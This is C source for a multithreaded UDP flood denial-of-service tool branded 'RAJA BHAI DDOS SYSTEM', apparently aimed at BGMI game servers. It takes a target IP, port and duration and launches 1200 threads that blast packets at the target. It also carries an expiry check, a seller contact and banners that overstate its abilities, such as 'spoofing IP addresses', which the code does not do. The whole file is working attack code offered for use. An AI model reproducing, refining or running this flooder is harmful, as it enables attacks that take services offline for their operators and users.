#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <pthread.h>
#include <stdatomic.h>

#define EXPIRY_DATE "2026-04-30"
#define PACKET_SIZE 128  // Packet size (1KB)
#define MAX_SOCKETS 4  // Har thread 4 alag sockets use karega
#define THREAD_COUNT 1200  // Total 1200 threads

atomic_ulong data_sent_bytes = 0; // Atomic data counter (bytes me)

typedef struct {
    char ip[1024];
    int port;
    int duration;
} AttackParams;

int is_expired() {
    int expiry_year, expiry_month, expiry_day;
    sscanf(EXPIRY_DATE, "%d-%d-%d", &expiry_year, &expiry_month, &expiry_day);
    time_t now = time(NULL);
    struct tm *current_time = localtime(&now);
    return (current_time->tm_year + 1900 > expiry_year ||
            (current_time->tm_year + 1900 == expiry_year && current_time->tm_mon + 1 > expiry_month) ||
            (current_time->tm_year + 1900 == expiry_year && current_time->tm_mon + 1 == expiry_month && current_time->tm_mday > expiry_day));
}

void* send_udp_packets(void* arg) {
    AttackParams *params = (AttackParams *)arg;
    struct sockaddr_in server_addr;
    char payload[PACKET_SIZE];
    memset(payload, 'X', PACKET_SIZE);

    int sockets[MAX_SOCKETS];
    for (int i = 0; i < MAX_SOCKETS; i++) {
        if ((sockets[i] = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            pthread_exit(NULL);
        }
        fcntl(sockets[i], F_SETFL, O_NONBLOCK);

        struct sockaddr_in local_addr = {0};
        local_addr.sin_family = AF_INET;
        local_addr.sin_port = htons(1024 + (rand() % 64511)); // Random source port (firewall bypass)
        local_addr.sin_addr.s_addr = INADDR_ANY;
        bind(sockets[i], (struct sockaddr*)&local_addr, sizeof(local_addr));
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->ip, &server_addr.sin_addr);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        for (int i = 0; i < MAX_SOCKETS; i++) {
            sendto(sockets[i], payload, PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
            atomic_fetch_add(&data_sent_bytes, PACKET_SIZE); // Atomic bytes counter
        }
    }

    for (int i = 0; i < MAX_SOCKETS; i++) close(sockets[i]);
    pthread_exit(NULL);
}

void print_stylish_text() {
    // Clear screen and set black background
    printf("\033[2J\033[H\033[40m");

    // Matrix-style green color palette
    const char* matrix_colors[] = {
        "\033[38;5;46m",  // Bright green
        "\033[38;5;82m",  // Neon green
        "\033[38;5;118m", // Light green
        "\033[38;5;154m" // Yellow-green
    };
    int num_colors = sizeof(matrix_colors) / sizeof(matrix_colors[0]);

    // Print Matrix-style header animation
    printf("%s", matrix_colors[0]);
    printf("╔════════════════════════════════════════════╗\n");
    printf("║                                            ║\n");
    printf("║   ");
    
    // Animated "RAJA BHAI" text with scanning effect
    const char* rajabhai = "RAJA BHAI DDOS SYSTEM";
    for (int i = 0; i < strlen(rajabhai); i++) {
        printf("%s%c%s", matrix_colors[rand() % num_colors], rajabhai[i], matrix_colors[0]);
        fflush(stdout);
        usleep(50000 + rand() % 100000); // Random delay for Matrix effect
    }
    
    printf("   ║\n");
    printf("║                                            ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");

    // Print pulsing warning text
    const char* warning = "WARNING: POWERFUL TOOL - USE AT YOUR OWN RISK";
    for (int pulse = 0; pulse < 3; pulse++) {
        for (int i = 0; i < strlen(warning); i++) {
            printf("%s%c", matrix_colors[pulse % num_colors], warning[i]);
        }
        printf("\r");
        fflush(stdout);
        usleep(200000);
    }
    printf("%s%s\033[0m\n\n", matrix_colors[3], warning);

    // Print connection status animation
    printf("%s[+] INITIALIZING DDOS ENGINE...\n", matrix_colors[1]);
    usleep(300000);
    printf("%s[+] BYPASSING FIREWALLS...\n", matrix_colors[2]);
    usleep(300000);
    printf("%s[+] SPOOFING IP ADDRESSES...\n", matrix_colors[3]);
    usleep(300000);
    printf("%s[+] ACTIVATING %d THREADS...\n", matrix_colors[0], THREAD_COUNT);
    usleep(300000);
    printf("%s[+] READY TO DESTROY TARGETS!\n\n", matrix_colors[1]);

    // Print rotating skull animation
    const char* skulls[] = {
        "   (•̀ᴗ•́)و ̑̑  ",
        "   (☠️◣_◢☠️)  ",
        "   (╬ಠ益ಠ)╬  ",
        "   (⌐■_■)☞  "
    };
    for (int i = 0; i < 4; i++) {
        printf("\r%s%s %sDDOS ATTACK INITIATED", matrix_colors[i % num_colors], skulls[i], matrix_colors[(i+1) % num_colors]);
        fflush(stdout);
        usleep(200000);
    }

    // Print final system info
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    printf("\n\n%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n", matrix_colors[2]);
    printf("%s█ SYSTEM TIME: %02d:%02d:%02d  █  ", matrix_colors[3], tm->tm_hour, tm->tm_min, tm->tm_sec);
    printf("%sEXPIRY: %s %s█\n", matrix_colors[1], EXPIRY_DATE, matrix_colors[3]);
    printf("%s█ THREADS: %-4d █  PACKET SIZE: %-4d █\n", matrix_colors[0], THREAD_COUNT, PACKET_SIZE);
    printf("%s▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\033[0m\n\n", matrix_colors[2]);

    // Final flashing warning
    for (int i = 0; i < 3; i++) {
        printf("\r%s!!! DON'T SELL THIS TOOL - RESPECT THE CODE !!!", matrix_colors[i % num_colors]);
        fflush(stdout);
        usleep(150000);
    }
    printf("\033[0m\n\n");
}

void* display_live_stats(void* arg) {
    time_t start_time = time(NULL);
    while (1) {
        sleep(1);
        double elapsed_time = difftime(time(NULL), start_time);
        double data_sent_gb = atomic_load(&data_sent_bytes) / (1024.0 * 1024.0 * 1024.0);
        printf("\r\033[1;36m[ LIVE STATS ] Time: %.0fs | Data Sent: %.2f GB\033[0m", elapsed_time, data_sent_gb);
        fflush(stdout);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (strcmp(argv[0], "./bgmi") != 0) {
        fprintf(stderr, "Error: Rename binary to 'bgmi' and run again.\n");
        return 1;
    }

    if (is_expired()) {
        fprintf(stderr, "\033[1;31mERROR: File expired. Contact @RAJA BHAI for new version.\033[0m\n");
        return 1;
    }

    print_stylish_text();

    if (argc < 4) {
        printf("Usage: %s <IP> <Port> <Time>\n", argv[0]);
        return 1;
    }

    AttackParams params;
    strncpy(params.ip, argv[1], sizeof(params.ip) - 1);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    printf("\033[1;32mStarting Attack on %s:%d | Duration: %d sec | Packet Size: %d bytes\n\033[0m",
           params.ip, params.port, params.duration, PACKET_SIZE);

    pthread_t stat_thread;
    pthread_create(&stat_thread, NULL, display_live_stats, NULL); // Live stats display

    pthread_t threads[THREAD_COUNT];
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, send_udp_packets, &params);
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\033[1;34mAttack Finished. Contact @RAJA BHAI for more.\033[0m\n");
    return 0;
}
